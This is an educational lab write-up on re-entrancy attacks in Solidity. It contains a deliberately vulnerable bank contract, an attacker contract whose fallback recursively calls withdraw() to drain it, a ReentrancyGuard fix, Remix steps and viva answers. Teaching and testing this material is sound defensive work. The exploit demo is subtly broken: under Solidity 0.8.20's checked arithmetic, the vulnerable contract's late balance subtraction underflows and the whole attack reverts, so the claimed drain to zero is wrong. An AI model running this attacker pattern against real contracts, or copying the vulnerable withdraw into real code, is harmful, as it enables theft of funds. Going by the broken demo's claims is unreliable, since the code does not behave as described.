# Experiment No-7 — Security Analysis of Smart Contracts (Re-entrancy Attack)

## Title

Security Analysis of Smart Contracts (Detecting and Preventing Re-entrancy Attacks)

## Aim

To study, detect, exploit, and prevent re-entrancy attacks in Ethereum smart contracts using Solidity. The experiment demonstrates how a poorly written contract can be drained of funds and how secure coding patterns prevent this.

---

## Theory

### Smart Contracts

Self-executing programs stored on the Ethereum blockchain. They manage state and assets, making security extremely important.

### Re-entrancy Attack

A vulnerability that occurs when:

* A contract **sends ETH to an external address/contract** *before* updating its internal state.
* The external contract (attacker) re-enters the vulnerable function (usually via `fallback()` or `receive()`) *before* the state update occurs.
* The attacker repeatedly withdraws funds, draining the contract.

**Famous Example:** The DAO Hack (2016) — $60M stolen because of a re-entrancy bug.

### Why Re-entrancy Happens

* External calls like `call()`, `send()`, and `transfer()` allow control to pass to another contract.
* If the contract's state is updated *after* such calls, attackers can exploit the window.

### Prevention Techniques

1. **Checks-Effects-Interactions Pattern** (update state before external calls)
2. **ReentrancyGuard** modifier from OpenZeppelin
3. **Avoid external calls** to untrusted contracts or limit them

---

## Key Characteristics of Re-entrancy Attacks

* Occur during external calls (e.g., `call{value: ...}`)
* Attacker drains funds using recursive fallback calls
* State inconsistency due to late balance update
* High severity — can drain entire contract balance

---

## Steps of Execution

### Part A – Vulnerable Contract

1. Open Remix IDE
2. Create `VulnerableBank.sol`
3. Write a `withdraw()` function that sends ETH first and updates balance later
4. Deploy contract & deposit ETH

### Part B – Attacker Contract

1. Create `Attacker.sol`
2. Write fallback function to recursively call `withdraw()`
3. Deploy attacker contract pointing to VulnerableBank
4. Perform attack → observe fund drain

### Part C – Fixing the Vulnerability

1. Update contract to follow Checks-Effects-Interactions **OR**
2. Use OpenZeppelin's `ReentrancyGuard`
3. Redeploy and re-test
4. Attack should now fail

---

## Vulnerable Contract — VulnerableBank.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableBank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, "Not enough balance");

        // ❌ Vulnerable: Sending ETH before updating balance
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
}
```

---

## Attacker Contract — Attacker.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint _amount) external;
}

contract Attacker {
    IVulnerableBank public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    // Start the attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    // Called when bank sends ETH → triggers re-entrancy
    fallback() external payable {
        uint targetBalance = address(bank).balance;
        if (targetBalance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function withdrawAll() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
```

---

## Fixed Contract — SafeBank.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeBank is ReentrancyGuard {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public nonReentrant {
        require(balances[msg.sender] >= _amount, "Not enough balance");

        // ✅ Effect before interaction
        balances[msg.sender] -= _amount;

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
}
```

---

## Remix Procedure (Detailed)

### A. Deploy Vulnerable Contract

1. Open Remix → Create `VulnerableBank.sol`
2. Paste the vulnerable code
3. Compile (0.8.20 or above)
4. Deploy using **Remix VM** (recommended for easy testing)
5. Use the **deposit** function to add ETH for testing

### B. Deploy Attacker Contract

1. Create `Attacker.sol`
2. Paste attacker code
3. Compile
4. Deploy attacker with constructor argument = address of VulnerableBank
5. Use the `attack()` function (send 1 ETH)
6. Observe VulnerableBank's balance dropping to zero

### C. Fix & Verify

1. Deploy `SafeBank.sol`
2. Deposit ETH
3. Deploy attacker again pointing to SafeBank
4. Attack → Should fail because:

   * ReentrancyGuard blocks recursive calls
   * State updated before transfer

---

## Key Points

* Re-entrancy occurs when external calls happen before state updates
* The DAO hack was caused by this vulnerability
* Use **Checks-Effects-Interactions**, **ReentrancyGuard**, or avoid external calls
* Never trust external contracts
* Always test smart contracts with known attack vectors

---

## Conclusion

In this experiment, we implemented a vulnerable smart contract, exploited it using a malicious contract, and then patched the vulnerability using secure coding techniques. This demonstrates the importance of following secure patterns in blockchain development.

---


## Viva Questions

**1. What is a re-entrancy attack in Ethereum?**
A re-entrancy attack occurs when an external contract repeatedly calls back into a vulnerable contract *before* the previous function execution is complete, allowing the attacker to drain funds or modify state unexpectedly.

**2. How did the DAO hack exploit re-entrancy?**
The DAO contract sent Ether *before* updating the user’s balance. Attackers used this flaw to repeatedly re-enter the withdrawal function, draining the DAO by calling the fallback function in a loop before the balance was updated.

**3. Why is `call()` risky compared to `transfer()`?**
`call()` forwards all remaining gas to the recipient, enabling arbitrary code execution, including recursive calls.
`transfer()` only forwards 2300 gas, enough for logging but not re-entrant logic.
Because of the higher gas forwarding, `call()` can open the door to re-entrancy if not handled safely.

**4. Explain the Checks-Effects-Interactions pattern.**
This is a secure coding pattern to prevent re-entrancy:

1. **Check** conditions first (e.g., require statements).
2. **Effects** update internal state next (balances, mappings).
3. **Interactions** (external calls) occur last.
   This ensures attackers cannot exploit inconsistent internal state.

**5. What is the role of OpenZeppelin’s ReentrancyGuard?**
ReentrancyGuard uses a simple locking mechanism (a “nonReentrant” modifier) to block a function from being called again until the first execution is completed, preventing recursive re-entry.

**6. How can you detect a re-entrancy bug before deployment?**
You can detect it using tools like Slither, MythX, Mythril, or Hardhat security plugins, combined with unit tests that simulate malicious contracts designed to re-enter functions. Manual code review and audit patterns also help identify risky external calls.

**7. Why is security more critical in smart contracts than in normal applications?**
Smart contracts manage real value, are immutable once deployed, and run on a public blockchain where anyone can interact with them. Bugs cannot be easily patched, and exploits result in irreversible loss of funds — making security extremely critical.

